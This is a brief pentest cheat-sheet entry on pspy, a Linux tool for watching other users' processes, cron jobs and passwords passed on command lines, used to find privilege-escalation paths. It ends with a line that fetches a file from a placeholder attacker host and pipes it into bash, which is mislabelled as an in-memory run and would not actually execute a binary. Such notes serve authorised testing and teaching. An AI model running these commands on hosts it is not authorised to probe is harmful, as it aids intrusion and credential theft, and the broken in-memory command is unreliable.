# 09.04 pspy

> Linux process snooper — observe processes and command-line arguments without root, catch cron jobs and password parameters.

## Overview

pspy uses /proc filesystem to monitor process executions in real time without root privilege. Reveals scheduled tasks/cron jobs running with elevated privileges, password arguments leaked on command lines, scripts run by other users. Critical for finding privesc paths on shared multi-user Linux hosts.

## Steps

- **Step 1** - Download binary.
- **Step 2** - Run on target.
- **Step 3** - Wait — cron jobs run on schedule (every minute, hour, etc.).

## Commands

### Get binary

```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
```

### Run

```bash
./pspy64                                                       # default settings
./pspy64 -pf -i 1000                                          # see file events too
./pspy64 -p -f -i 1000 -r /tmp,/var/tmp                       # focus on specific dirs
```

### In-memory run

```bash
curl -s http://<ATTACKER>/pspy64 | bash
```
